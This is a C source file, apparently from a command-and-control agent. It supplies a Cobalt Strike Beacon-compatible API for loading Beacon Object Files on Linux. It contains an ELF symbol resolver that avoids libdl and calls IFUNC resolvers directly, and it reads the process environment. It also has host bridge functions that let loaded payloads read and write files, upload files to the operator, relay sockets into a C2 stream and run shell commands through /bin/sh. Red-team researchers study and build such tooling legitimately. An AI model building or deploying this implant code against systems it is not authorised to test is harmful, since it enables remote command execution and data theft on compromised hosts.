/* Cobalt Strike Beacon compatibility API for Linux BOFs.
 *
 * Adapted from TrustedSec ELFLoader's beacon_compatibility.c (BSD; see
 * core/modules/SA_linux/LICENSE.txt), with bounds checks and a working reset.
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <link.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "beacon_compat.h"

/* Bound the captured output. Keep it below the agent's 10 MiB tunnel frame
 * cap so one BOF result fits in one response, and so a BOF that prints
 * without end cannot grow the agent's heap without limit. */
#define BOF_OUTPUT_MAX (8u << 20)

static char *output_buf = NULL;
static size_t output_len = 0;
static size_t output_cap = 0;

static void output_append(const char *data, size_t len) {
  if (data == NULL || len == 0)
    return;
  if (len > BOF_OUTPUT_MAX - 1u - output_len)
    return;
  if (output_len + len + 1 > output_cap) {
    size_t new_cap = output_cap ? output_cap * 2 : 4096;
    if (new_cap < output_len + len + 1)
      new_cap = output_len + len + 4096;
    if (new_cap > BOF_OUTPUT_MAX)
      new_cap = BOF_OUTPUT_MAX;
    char *new_buf = realloc(output_buf, new_cap);
    if (!new_buf)
      return;
    output_buf = new_buf;
    output_cap = new_cap;
  }
  memcpy(output_buf + output_len, data, len);
  output_len += len;
  output_buf[output_len] = '\0';
}

void beacon_output_reset(void) {
  free(output_buf);
  output_buf = NULL;
  output_len = 0;
  output_cap = 0;
}

char *beacon_output_take(void) {
  char *buf = output_buf;
  output_buf = NULL;
  output_len = 0;
  output_cap = 0;
  return buf;
}

void BeaconPrintf(int type, const char *fmt, ...) {
  (void)type;
  if (fmt == NULL)
    return;

  va_list ap;
  va_start(ap, fmt);
  int needed = vsnprintf(NULL, 0, fmt, ap);
  va_end(ap);
  if (needed < 0)
    return;

  char *buf = malloc((size_t)needed + 1);
  if (!buf)
    return;
  va_start(ap, fmt);
  vsnprintf(buf, (size_t)needed + 1, fmt, ap);
  va_end(ap);

  output_append(buf, (size_t)needed);
  output_append("\n", 1);
  free(buf);
}

void BeaconOutput(int type, const char *data, int len) {
  (void)type;
  if (data != NULL && len > 0)
    output_append(data, (size_t)len);
}

static uint32_t swap_endianess(uint32_t indata) {
  uint32_t testint = 0xaabbccdd;
  uint32_t outint = indata;
  if (((unsigned char *)&testint)[0] == 0xdd) {
    ((unsigned char *)&outint)[0] = ((unsigned char *)&indata)[3];
    ((unsigned char *)&outint)[1] = ((unsigned char *)&indata)[2];
    ((unsigned char *)&outint)[2] = ((unsigned char *)&indata)[1];
    ((unsigned char *)&outint)[3] = ((unsigned char *)&indata)[0];
  }
  return outint;
}

void BeaconFormatAlloc(formatp *format, int maxsz) {
  if (format == NULL || maxsz <= 0)
    return;
  format->original = (char *)calloc((size_t)maxsz, 1);
  format->buffer = format->original;
  format->length = 0;
  format->size = format->original ? maxsz : 0;
}

void BeaconFormatReset(formatp *format) {
  if (format == NULL || format->original == NULL)
    return;
  memset(format->original, 0, (size_t)format->size);
  format->buffer = format->original;
  format->length = 0;
}

void BeaconFormatFree(formatp *format) {
  if (format == NULL)
    return;
  free(format->original);
  format->original = NULL;
  format->buffer = NULL;
  format->length = 0;
  format->size = 0;
}

void BeaconFormatAppend(formatp *format, char *text, int len) {
  if (format == NULL || text == NULL || len <= 0 || format->original == NULL)
    return;
  if (format->length < 0 || format->length > format->size ||
      len > format->size - format->length)
    return;
  memcpy(format->buffer, text, (size_t)len);
  format->buffer += len;
  format->length += len;
}

void BeaconFormatPrintf(formatp *format, char *fmt, ...) {
  if (format == NULL || fmt == NULL || format->original == NULL)
    return;
  int available = format->size - format->length;
  if (available <= 0)
    return;

  va_list args;
  va_start(args, fmt);
  int needed = vsnprintf(format->buffer, (size_t)available, fmt, args);
  va_end(args);
  if (needed < 0)
    return;
  int written = needed < available ? needed : available - 1;
  format->buffer += written;
  format->length += written;
}

char *BeaconFormatToString(formatp *format, int *size) {
  if (format == NULL)
    return NULL;
  if (size != NULL)
    *size = format->length;
  return format->original;
}

void BeaconFormatInt(formatp *format, int value) {
  if (format == NULL || format->original == NULL)
    return;
  if (format->length < 0 || format->length > format->size ||
      format->size - format->length < 4)
    return;
  uint32_t outdata = swap_endianess((uint32_t)value);
  memcpy(format->buffer, &outdata, 4);
  format->length += 4;
  format->buffer += 4;
}

int BeaconIsAdmin(void) {
  return geteuid() == 0;
}

void BeaconDataParse(datap *parser, char *buffer, int size) {
  if (parser == NULL)
    return;
  parser->original = buffer;
  parser->buffer = buffer;
  parser->length = 0;
  parser->size = 0;
  if (buffer == NULL || size < 4)
    return;

  /* The loader's argument buffer starts with a uint32 body length, matching
   * the Windows COFFLoader ABI and hello_linux's in-BOF helper. BOFs pass the
   * whole buffer to BeaconDataParse, so skip that prefix and clamp the body to
   * the supplied size before exposing it to BeaconData* accessors. */
  uint32_t body_len;
  memcpy(&body_len, buffer, 4);
  size_t available = (size_t)size - 4;
  if (body_len > available)
    body_len = (uint32_t)available;
  parser->buffer = buffer + 4;
  parser->length = (int)body_len;
  parser->size = (int)body_len;
}

int BeaconDataInt(datap *parser) {
  if (parser == NULL || parser->length < 4)
    return 0;
  int value;
  memcpy(&value, parser->buffer, 4);
  parser->buffer += 4;
  parser->length -= 4;
  return value;
}

short BeaconDataShort(datap *parser) {
  if (parser == NULL || parser->length < 2)
    return 0;
  short value;
  memcpy(&value, parser->buffer, 2);
  parser->buffer += 2;
  parser->length -= 2;
  return value;
}

int BeaconDataLength(datap *parser) {
  return parser != NULL ? parser->length : 0;
}

char *BeaconDataExtract(datap *parser, int *size) {
  if (size != NULL)
    *size = 0;
  if (parser == NULL || parser->length < 4)
    return NULL;

  int len;
  memcpy(&len, parser->buffer, 4);
  parser->buffer += 4;
  parser->length -= 4;
  if (len < 0 || len > parser->length)
    return NULL;

  char *out = parser->buffer;
  parser->buffer += len;
  parser->length -= len;
  if (size != NULL)
    *size = len;
  return out;
}

/* ---- host symbol resolution -------------------------------------------- */

/*
 * BOF imports resolve against the loaded libc, libm and libgcc_s, the same
 * policy src/util/elfload.c applies to its own imports. libdl is never loaded:
 * glibc's __libc_dlsym returns a GNU IFUNC's resolver instead of the
 * implementation a BOF must call, so the lookup reads the module's dynamic
 * symbol table, checks the symbol type, and invokes the resolver.
 *
 * The loader ships on its own (its build cannot reach the agent's sources), so
 * this is a self-contained lookup rather than a link to src/util/dynload.c.
 */

#define HOST_IFUNC 10
#define HOST_MAX_SEGS 16
#define HOST_MAX_PHNUM 1024

#define HOST_ELF64_EHDR 64
#define HOST_ELF64_PHDR 56
#define HOST_ELF64_DYN 16
#define HOST_ELF64_SYM 24
#define HOST_PT_LOAD 1
#define HOST_PT_DYNAMIC 2
#define HOST_DT_NULL 0
#define HOST_DT_HASH 4
#define HOST_DT_STRTAB 5
#define HOST_DT_SYMTAB 6
#define HOST_DT_GNU_HASH 0x6ffffef5

typedef struct {
  const uint8_t *base;
  size_t len;
} host_view;

/* A PT_LOAD segment: a module's address span can contain unmapped gaps, so
 * every table read is checked against the segment that contains it. */
typedef struct {
  const uint8_t *p;
  size_t len;
} host_seg;

typedef struct {
  uint32_t st_name;
  uint8_t st_info;
  uint16_t st_shndx;
  unsigned long st_value;
} host_sym;

static uint16_t host_rd16(const uint8_t *p) {
  return (uint16_t)(p[0] | (p[1] << 8));
}

static uint32_t host_rd32(const uint8_t *p) {
  return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) |
         ((uint32_t)p[3] << 24);
}

static uint64_t host_rd64(const uint8_t *p) {
  return (uint64_t)host_rd32(p) | ((uint64_t)host_rd32(p + 4) << 32);
}

static int host_in(const host_view *m, const void *p, size_t n) {
  const uint8_t *bp = (const uint8_t *)p;
  if (bp < m->base)
    return 0;
  size_t off = (size_t)(bp - m->base);
  return off <= m->len && n <= m->len - off;
}

static const void *host_at(const host_view *m, unsigned long off, size_t n) {
  if ((unsigned long)off > (unsigned long)m->len)
    return NULL;
  size_t o = (size_t)off;
  if (n > m->len - o)
    return NULL;
  return m->base + o;
}

/* DT_* pointers are absolute in a loaded module; a base-relative value is
 * accepted too. */
static const void *host_abs(const host_view *m, unsigned long v) {
  const void *p = (const void *)(uintptr_t)v;
  if (host_in(m, p, 1))
    return p;
  return host_at(m, v, 1);
}

static int host_seg_has(const host_seg *segs, int nsegs, const void *p,
                        size_t len) {
  const uint8_t *bp = (const uint8_t *)p;
  for (int i = 0; i < nsegs; i++) {
    const uint8_t *s = segs[i].p;
    if (bp < s)
      continue;
    size_t off = (size_t)(bp - s);
    if (off <= segs[i].len && len <= segs[i].len - off)
      return 1;
  }
  return 0;
}

static size_t host_seg_avail(const host_seg *segs, int nsegs, const void *p) {
  const uint8_t *bp = (const uint8_t *)p;
  for (int i = 0; i < nsegs; i++) {
    const uint8_t *s = segs[i].p;
    if (bp < s)
      continue;
    size_t off = (size_t)(bp - s);
    if (off <= segs[i].len)
      return segs[i].len - off;
  }
  return 0;
}

static int host_name_eq(const uint8_t *s, size_t max, const char *name) {
  for (size_t i = 0; i < max; i++) {
    unsigned char c = s[i];
    if (c != (unsigned char)name[i])
      return 0;
    if (c == 0)
      return 1;
  }
  return 0;
}

static int host_sym_read(const host_view *m, size_t sym_off, size_t idx,
                         host_sym *out) {
  if (sym_off > m->len)
    return 0;
  size_t avail = m->len - sym_off;
  if (idx >= avail / HOST_ELF64_SYM)
    return 0;
  const uint8_t *p = m->base + sym_off + idx * HOST_ELF64_SYM;
  out->st_name = host_rd32(p);
  out->st_info = p[4];
  out->st_shndx = (uint16_t)(p[6] | (p[7] << 8));
  out->st_value = (unsigned long)host_rd64(p + 8);
  return 1;
}

static int host_sym_named(const host_view *m, const host_seg *segs, int nsegs,
                          size_t str_off, const host_sym *sym,
                          const char *name) {
  if (sym->st_name == 0 || sym->st_shndx == 0)
    return 0;
  if (str_off > m->len)
    return 0;
  size_t avail = m->len - str_off;
  if ((size_t)sym->st_name >= avail)
    return 0;
  const uint8_t *np = m->base + str_off + sym->st_name;
  size_t max = avail - sym->st_name;
  if (nsegs > 0) {
    size_t sav = host_seg_avail(segs, nsegs, np);
    if (sav < max)
      max = sav;
  }
  return host_name_eq(np, max, name);
}

static void *host_sym_addr(const host_view *m, const host_seg *segs, int nsegs,
                           unsigned long st_value) {
  const void *a = host_at(m, st_value, 1);
  if (a == NULL)
    return NULL;
  if (nsegs > 0 && !host_seg_has(segs, nsegs, a, 1))
    return NULL;
  return (void *)a;
}

static void *host_sym_resolve(const host_view *m, const host_seg *segs,
                              int nsegs, const host_sym *sym,
                              uint8_t *out_type) {
  if (out_type != NULL)
    *out_type = sym->st_info;
  return host_sym_addr(m, segs, nsegs, sym->st_value);
}

/* GNU ELF string hash used by DT_GNU_HASH tables. */
static uint32_t host_gnu_hash(const char *name) {
  uint32_t h = 5381;
  for (const unsigned char *p = (const unsigned char *)name; *p; p++)
    h = (h << 5) + h + (uint32_t)*p;
  return h;
}

/* DT_GNU_HASH: nbuckets, symoffset, bloom_size, bloom_shift, bloom[],
 * buckets[], chains[]; chains[] is indexed relative to symoffset. */
static void *host_sym_gnu(const host_view *m, const host_seg *segs, int nsegs,
                          size_t sym_off, size_t str_off, const uint8_t *gp,
                          const char *name, uint8_t *out_type) {
  if (!host_in(m, gp, 16))
    return NULL;
  uint32_t nbuckets = host_rd32(gp);
  uint32_t symoffset = host_rd32(gp + 4);
  uint32_t bloom_size = host_rd32(gp + 8);
  uint32_t bloom_shift = host_rd32(gp + 12);
  if (nbuckets == 0 || bloom_size == 0 || bloom_shift >= 64)
    return NULL;

  size_t off_bloom = 16;
  if ((size_t)bloom_size > (SIZE_MAX - off_bloom) / sizeof(uint64_t))
    return NULL;
  size_t off_buckets = off_bloom + (size_t)bloom_size * sizeof(uint64_t);
  if ((size_t)nbuckets > (SIZE_MAX - off_buckets) / sizeof(uint32_t))
    return NULL;
  size_t off_chains = off_buckets + (size_t)nbuckets * sizeof(uint32_t);
  if (!host_in(m, gp, off_chains))
    return NULL;
  if (nsegs > 0 && !host_seg_has(segs, nsegs, gp, off_chains))
    return NULL;

  const uint8_t *bloom = gp + off_bloom;
  const uint8_t *buckets = gp + off_buckets;
  const uint8_t *chains = gp + off_chains;
  size_t chain_cap = (m->len - (size_t)(chains - m->base)) / sizeof(uint32_t);

  uint32_t h = host_gnu_hash(name);
  /* Widen before the bloom shift: the shift amount is 6-bit, so a 32-bit
   * shift would be undefined for shift >= 32 (glibc shifts a 64-bit value). */
  uint64_t hw = (uint64_t)h;
  uint64_t word =
      host_rd64(bloom + (size_t)((h / 64) % bloom_size) * sizeof(uint64_t));
  uint64_t mask = (1ULL << (hw % 64)) | (1ULL << ((hw >> bloom_shift) % 64));
  if ((word & mask) != mask)
    return NULL;

  uint32_t si = host_rd32(buckets + (size_t)(h % nbuckets) * sizeof(uint32_t));
  if (si == 0 || si < symoffset)
    return NULL;
  size_t start = (size_t)si - symoffset;
  if (start >= chain_cap)
    return NULL;

  for (size_t i = start; i < chain_cap; i++) {
    uint32_t eh = host_rd32(chains + i * sizeof(uint32_t));
    if ((eh | 1) == (h | 1)) {
      host_sym sym;
      if (host_sym_read(m, sym_off, (size_t)symoffset + i, &sym) &&
          host_sym_named(m, segs, nsegs, str_off, &sym, name))
        return host_sym_resolve(m, segs, nsegs, &sym, out_type);
    }
    if (eh & 1)
      break; /* chain terminator */
  }
  return NULL;
}

static void *host_lookup_module(const host_view *m, const char *name,
                                uint8_t *out_type) {
  if (out_type != NULL)
    *out_type = 0;
  if (m == NULL || name == NULL || m->len < HOST_ELF64_EHDR)
    return NULL;

  const uint8_t *e = m->base;
  if (e[0] != 0x7f || e[1] != 'E' || e[2] != 'L' || e[3] != 'F')
    return NULL;
  if (e[4] != 2 /* ELFCLASS64 */ || e[5] != 1 /* ELFDATA2LSB */ ||
      e[6] != 1 /* EV_CURRENT */)
    return NULL;
  unsigned long phoff = (unsigned long)host_rd64(e + 32);
  uint16_t phentsize = host_rd16(e + 54);
  uint16_t phnum = host_rd16(e + 56);
  if (phentsize != HOST_ELF64_PHDR || phnum == 0 || phnum > HOST_MAX_PHNUM)
    return NULL;

  host_seg segs[HOST_MAX_SEGS];
  int nsegs = 0;
  size_t dyn_off = 0;
  size_t dyn_bytes = 0;
  int have_dyn = 0;
  for (unsigned i = 0; i < (unsigned)phnum; i++) {
    size_t off = (size_t)phoff + (size_t)i * HOST_ELF64_PHDR;
    if (off > m->len || HOST_ELF64_PHDR > m->len - off)
      break;
    const uint8_t *ph = m->base + off;
    uint32_t p_type = host_rd32(ph);
    unsigned long p_vaddr = (unsigned long)host_rd64(ph + 16);
    unsigned long p_filesz = (unsigned long)host_rd64(ph + 32);
    unsigned long p_memsz = (unsigned long)host_rd64(ph + 40);
    if (p_type == HOST_PT_LOAD && nsegs < HOST_MAX_SEGS) {
      const uint8_t *s = (const uint8_t *)host_at(m, p_vaddr, 1);
      if (s) {
        size_t avail = m->len - (size_t)(s - m->base);
        size_t seglen = (size_t)p_memsz;
        if (seglen > avail)
          seglen = avail;
        segs[nsegs].p = s;
        segs[nsegs].len = seglen;
        nsegs++;
      }
    }
    if (p_type == HOST_PT_DYNAMIC && !have_dyn) {
      const uint8_t *dp = (const uint8_t *)host_at(m, p_vaddr, 1);
      if (dp) {
        dyn_off = (size_t)(dp - m->base);
        size_t avail = m->len - dyn_off;
        dyn_bytes = (size_t)p_filesz;
        if (dyn_bytes > avail)
          dyn_bytes = avail;
        have_dyn = 1;
      }
    }
  }
  if (!have_dyn || dyn_bytes < HOST_ELF64_DYN)
    return NULL;

  unsigned long symtab_v = 0;
  unsigned long strtab_v = 0;
  unsigned long hash_v = 0;
  unsigned long ghash_v = 0;
  size_t dyn_count = dyn_bytes / HOST_ELF64_DYN;
  for (size_t i = 0; i < dyn_count; i++) {
    const uint8_t *dp = m->base + dyn_off + i * HOST_ELF64_DYN;
    long d_tag = (long)host_rd64(dp);
    unsigned long d_val = (unsigned long)host_rd64(dp + 8);
    if (d_tag == HOST_DT_NULL)
      break;
    if (d_tag == HOST_DT_SYMTAB)
      symtab_v = d_val;
    else if (d_tag == HOST_DT_STRTAB)
      strtab_v = d_val;
    else if (d_tag == HOST_DT_HASH)
      hash_v = d_val;
    else if (d_tag == HOST_DT_GNU_HASH)
      ghash_v = d_val;
  }
  if (symtab_v == 0 || strtab_v == 0)
    return NULL;

  const uint8_t *symtab = (const uint8_t *)host_abs(m, symtab_v);
  const uint8_t *strtab = (const uint8_t *)host_abs(m, strtab_v);
  if (symtab == NULL || strtab == NULL)
    return NULL;
  if (nsegs > 0 && (!host_seg_has(segs, nsegs, symtab, HOST_ELF64_SYM) ||
                    !host_seg_has(segs, nsegs, strtab, 1)))
    return NULL;
  size_t sym_off = (size_t)(symtab - m->base);
  size_t str_off = (size_t)(strtab - m->base);

  /* SysV hash: nchain is the exact symbol count, so a linear scan is safe. */
  if (hash_v) {
    const uint8_t *hp = (const uint8_t *)host_abs(m, hash_v);
    if (hp == NULL || !host_in(m, hp, 2 * sizeof(uint32_t)))
      return NULL;
    uint32_t nbucket = host_rd32(hp);
    uint32_t nchain = host_rd32(hp + 4);
    size_t words = (size_t)nbucket + (size_t)nchain;
    if (words > SIZE_MAX / sizeof(uint32_t) - 2)
      return NULL;
    size_t bytes = (2 + words) * sizeof(uint32_t);
    if (!host_in(m, hp, bytes))
      return NULL;
    if (nsegs > 0 && !host_seg_has(segs, nsegs, hp, bytes))
      return NULL;
    if ((size_t)nchain > (m->len - sym_off) / HOST_ELF64_SYM)
      return NULL;
    for (size_t i = 0; i < (size_t)nchain; i++) {
      host_sym sym;
      if (!host_sym_read(m, sym_off, i, &sym))
        break;
      if (host_sym_named(m, segs, nsegs, str_off, &sym, name))
        return host_sym_resolve(m, segs, nsegs, &sym, out_type);
    }
    return NULL;
  }

  if (ghash_v) {
    const uint8_t *gp = (const uint8_t *)host_abs(m, ghash_v);
    if (gp)
      return host_sym_gnu(m, segs, nsegs, sym_off, str_off, gp, name, out_type);
  }
  return NULL;
}

/* A GNU IFUNC's st_value is its resolver: invoke it exactly as the dynamic
 * linker does. */
static void *host_ifunc(void *resolver) {
  typedef void *(*ifunc_fn)(void);
  return ((ifunc_fn)resolver)();
}

/* Module basenames a BOF may import from. libc also serves libpthread and
 * libdl on glibc >= 2.34. */
static const char *const host_libs[] = {
    "libc.so", "libc-", "libc.musl",   "ld-musl",
    "libm.so", "libm-", "libgcc_s.so", "libgcc_s-",
};

typedef struct {
  const char *needle;
  unsigned long base;
  unsigned long end;
} host_visit;

static const char *host_basename(const char *path) {
  const char *base = path;
  if (path == NULL)
    return NULL;
  for (const char *p = path; *p; p++)
    if (*p == '/')
      base = p + 1;
  return base;
}

/* Match a module basename by SONAME prefix, requiring a boundary so "libc.so"
 * selects libc.so.6 and not libc.so.bak. */
static int host_name_matches(const char *base, const char *needle) {
  if (base == NULL || needle == NULL || needle[0] == '\0')
    return 0;
  size_t len = strlen(needle);
  if (strncmp(base, needle, len) != 0)
    return 0;
  char next = base[len];
  if (next == '\0')
    return 1;
  if (needle[len - 1] == '-')
    return next >= '0' && next <= '9';
  if (len >= 3 && strcmp(needle + len - 3, ".so") == 0)
    return next == '.' && base[len + 1] >= '0' && base[len + 1] <= '9';
  if (strstr(needle, "musl") != NULL)
    return next == '-' || next == '.';
  return next == '.' || next == '-' || next == '_';
}

static int host_visit_phdr(struct dl_phdr_info *info, size_t size, void *data) {
  (void)size;
  host_visit *v = (host_visit *)data;
  const char *name = info->dlpi_name;
  if (name == NULL || name[0] == '\0')
    return 0;
  if (!host_name_matches(host_basename(name), v->needle))
    return 0;

  unsigned long end = (unsigned long)info->dlpi_addr;
  for (unsigned i = 0; i < info->dlpi_phnum; i++) {
    const ElfW(Phdr) *ph = &info->dlpi_phdr[i];
    if (ph->p_type != PT_LOAD)
      continue;
    unsigned long seg_end = (unsigned long)info->dlpi_addr +
                            (unsigned long)ph->p_vaddr +
                            (unsigned long)ph->p_memsz;
    if (seg_end > end)
      end = seg_end;
  }
  v->base = (unsigned long)info->dlpi_addr;
  v->end = end;
  return 1;
}

static unsigned long host_find_module(const char *needle, unsigned long *end) {
  host_visit v = {needle, 0, 0};
  dl_iterate_phdr(host_visit_phdr, &v);
  if (v.base != 0 && end != NULL)
    *end = v.end;
  return v.base;
}

static void *host_lookup(const char *name) {
  for (size_t i = 0; i < sizeof(host_libs) / sizeof(host_libs[0]); i++) {
    unsigned long end = 0;
    unsigned long base = host_find_module(host_libs[i], &end);
    if (base == 0 || end <= base)
      continue;
    host_view m = {(const uint8_t *)base, (size_t)(end - base)};
    uint8_t info = 0;
    void *addr = host_lookup_module(&m, name, &info);
    if (addr == NULL)
      continue;
    return ((info & 0xf) == HOST_IFUNC) ? host_ifunc(addr) : addr;
  }
  return NULL;
}

/* glibc before 2.34 keeps the dl* entry points in a separate library; libc
 * exports the internal __libc_* equivalents instead. */
static const struct {
  const char *name;
  const char *alias;
} host_aliases[] = {
    {"dlsym", "__libc_dlsym"},        {"__libc_dlsym", "dlsym"},
    {"dlopen", "__libc_dlopen_mode"}, {"__libc_dlopen_mode", "dlopen"},
    {"dlclose", "__libc_dlclose"},    {"__libc_dlclose", "dlclose"},
};

void *beacon_host_dlsym(const char *name) {
  if (name == NULL || name[0] == '\0')
    return NULL;
  void *addr = host_lookup(name);
  if (addr != NULL)
    return addr;
  for (size_t i = 0; i < sizeof(host_aliases) / sizeof(host_aliases[0]); i++) {
    if (strcmp(name, host_aliases[i].name) == 0)
      return host_lookup(host_aliases[i].alias);
  }
  return NULL;
}

/* getEnviron must return a live char **. A data symbol cannot be resolved the
 * way function imports are, and a direct environ import needs a data
 * relocation the C agent's in-memory loader does not apply. Read
 * /proc/self/environ once instead and keep the parsed array for the lifetime
 * of the mapped loader. */
static char **env_cache;
static char *env_cache_buf;

static char **get_environ(void) {
  if (env_cache != NULL)
    return env_cache;

  FILE *f = fopen("/proc/self/environ", "rb");
  if (f == NULL)
    return NULL;

  size_t cap = 4096;
  char *buf = (char *)malloc(cap);
  if (buf == NULL) {
    fclose(f);
    return NULL;
  }
  size_t len = 0;
  for (;;) {
    if (len == cap) {
      if (cap >= (1u << 20)) {
        free(buf);
        fclose(f);
        return NULL;
      }
      size_t next = cap * 2;
      char *grown = (char *)realloc(buf, next);
      if (grown == NULL) {
        free(buf);
        fclose(f);
        return NULL;
      }
      buf = grown;
      cap = next;
    }
    size_t n = fread(buf + len, 1, cap - len, f);
    if (n == 0)
      break;
    len += n;
  }
  int failed = ferror(f);
  fclose(f);
  if (failed || len == 0) {
    free(buf);
    return NULL;
  }
  if (buf[len - 1] != '\0') {
    if (len == cap) {
      char *grown = (char *)realloc(buf, cap + 1);
      if (grown == NULL) {
        free(buf);
        return NULL;
      }
      buf = grown;
      cap++;
    }
    buf[len++] = '\0';
  }

  size_t count = 0;
  for (size_t i = 0; i < len; i++) {
    if (buf[i] == '\0' && i + 1 < len && buf[i + 1] != '\0')
      count++;
  }
  char **out = (char **)calloc(count + 2, sizeof(char *));
  if (out == NULL) {
    free(buf);
    return NULL;
  }
  size_t n = 0;
  out[n++] = buf;
  for (size_t i = 0; i + 1 < len; i++) {
    if (buf[i] == '\0' && buf[i + 1] != '\0')
      out[n++] = buf + i + 1;
  }
  out[n] = NULL;

  env_cache = out;
  env_cache_buf = buf;
  return env_cache;
}

/* Release the parsed environment after a BOF run. The loader image is mapped
 * per execution, so keeping it tied to the run avoids leaking one copy per
 * invocation in the agent process. */
void beacon_env_reset(void) {
  free(env_cache);
  free(env_cache_buf);
  env_cache = NULL;
  env_cache_buf = NULL;
}
static const char *get_os_name(void) {
  return "lin";
}

/* ------------------------------------------------------------------------- */
/* Optional host primitives for file-transfer BOFs                            */
/* ------------------------------------------------------------------------- */

typedef int (*host_read_fn)(void *ctx, const char *path, unsigned char **out,
                            unsigned long *len, char *err, int err_cap);
typedef int (*host_write_fn)(void *ctx, const char *path,
                             const unsigned char *data, unsigned long len,
                             char *err, int err_cap);
typedef int (*host_upload_fn)(void *ctx, const char *token, const char *path,
                              unsigned long offset, char *err, int err_cap);
typedef int (*host_sha256_fn)(void *ctx, const unsigned char *data,
                              unsigned long len, char *hex,
                              unsigned long hex_cap, char *err, int err_cap);
typedef int (*host_relay_fn)(void *ctx, const char *token, int fd,
                             int idle_seconds, char *err, int err_cap);
typedef int (*host_exec_fn)(void *ctx, const char *cmd, int shell, char *out,
                            unsigned long out_cap, char *err, int err_cap);

static void *host_ctx;
static host_read_fn host_read;
static host_write_fn host_write;
static host_upload_fn host_upload;
static host_sha256_fn host_sha256;
static host_relay_fn host_relay;
static host_exec_fn host_exec;

static void set_host_err(char *err, int err_cap, const char *msg) {
  if (err == NULL || err_cap <= 0)
    return;
  snprintf(err, (size_t)err_cap, "%s", msg != NULL ? msg : "unavailable");
}

__attribute__((visibility("default"))) void
SetHostBridge(void *ctx, host_read_fn read, host_write_fn write,
              host_upload_fn upload, host_sha256_fn sha256, host_relay_fn relay,
              host_exec_fn exec) {
  host_ctx = ctx;
  host_read = read;
  host_write = write;
  host_upload = upload;
  host_sha256 = sha256;
  host_relay = relay;
  host_exec = exec;
}

int ReadFile(const char *path, unsigned char **out, unsigned long *len,
             char *err, int err_cap) {
  if (host_read == NULL) {
    set_host_err(err, err_cap, "ReadFile unavailable");
    return -9;
  }
  return host_read(host_ctx, path, out, len, err, err_cap);
}

int WriteFile(const char *path, const unsigned char *data, unsigned long len,
              char *err, int err_cap) {
  if (host_write == NULL) {
    set_host_err(err, err_cap, "WriteFile unavailable");
    return -9;
  }
  return host_write(host_ctx, path, data, len, err, err_cap);
}

int UploadFile(const char *token, const char *path, unsigned long offset,
               char *err, int err_cap) {
  if (host_upload == NULL) {
    set_host_err(err, err_cap, "UploadFile unavailable");
    return -9;
  }
  return host_upload(host_ctx, token, path, offset, err, err_cap);
}

int Sha256Hex(const unsigned char *data, unsigned long len, char *hex,
              unsigned long hex_cap, char *err, int err_cap) {
  if (host_sha256 == NULL) {
    set_host_err(err, err_cap, "Sha256Hex unavailable");
    return -9;
  }
  return host_sha256(host_ctx, data, len, hex, hex_cap, err, err_cap);
}

/* Hand a connected socket to the C2 stream named by `token`. The relay owns the
 * socket from here on: it closes it when either side ends or the relay goes
 * idle. */
int RelaySocket(const char *token, int fd, int idle_seconds, char *err,
                int err_cap) {
  if (host_relay == NULL) {
    set_host_err(err, err_cap, "RelaySocket unavailable");
    return -9;
  }
  return host_relay(host_ctx, token, fd, idle_seconds, err, err_cap);
}

/* Run a command on the agent and copy its combined output into the BOF's
 * buffer. `shell` selects `/bin/sh -c`; zero executes it directly. Returns the
 * byte count, or a negative status. */
int ExecCmd(const char *cmd, int shell, char *out, int out_cap, char *err,
            int err_cap) {
  if (host_exec == NULL) {
    set_host_err(err, err_cap, "ExecCmd unavailable");
    return -9;
  }
  if (out == NULL || out_cap <= 0) {
    set_host_err(err, err_cap, "invalid output buffer");
    return -22;
  }
  return host_exec(host_ctx, cmd, shell, out, (unsigned long)out_cap, err,
                   err_cap);
}

static const struct {
  const char *name;
  void *fn;
} beacon_apis[] = {
    {"BeaconPrintf", (void *)BeaconPrintf},
    {"BeaconOutput", (void *)BeaconOutput},
    {"BeaconDataParse", (void *)BeaconDataParse},
    {"BeaconDataInt", (void *)BeaconDataInt},
    {"BeaconDataShort", (void *)BeaconDataShort},
    {"BeaconDataLength", (void *)BeaconDataLength},
    {"BeaconDataExtract", (void *)BeaconDataExtract},
    {"BeaconFormatAlloc", (void *)BeaconFormatAlloc},
    {"BeaconFormatReset", (void *)BeaconFormatReset},
    {"BeaconFormatFree", (void *)BeaconFormatFree},
    {"BeaconFormatAppend", (void *)BeaconFormatAppend},
    {"BeaconFormatPrintf", (void *)BeaconFormatPrintf},
    {"BeaconFormatToString", (void *)BeaconFormatToString},
    {"BeaconFormatInt", (void *)BeaconFormatInt},
    {"BeaconIsAdmin", (void *)BeaconIsAdmin},
    {"swap_endianess", (void *)swap_endianess},
    {"getEnviron", (void *)get_environ},
    {"getOSName", (void *)get_os_name},
    {"ReadFile", (void *)ReadFile},
    {"WriteFile", (void *)WriteFile},
    {"UploadFile", (void *)UploadFile},
    {"Sha256Hex", (void *)Sha256Hex},
    {"RelaySocket", (void *)RelaySocket},
    {"ExecCmd", (void *)ExecCmd},
};

void *beacon_api_lookup(const char *name) {
  if (name == NULL)
    return NULL;
  for (size_t i = 0; i < sizeof(beacon_apis) / sizeof(beacon_apis[0]); i++) {
    if (strcmp(name, beacon_apis[i].name) == 0)
      return beacon_apis[i].fn;
  }
  return NULL;
}
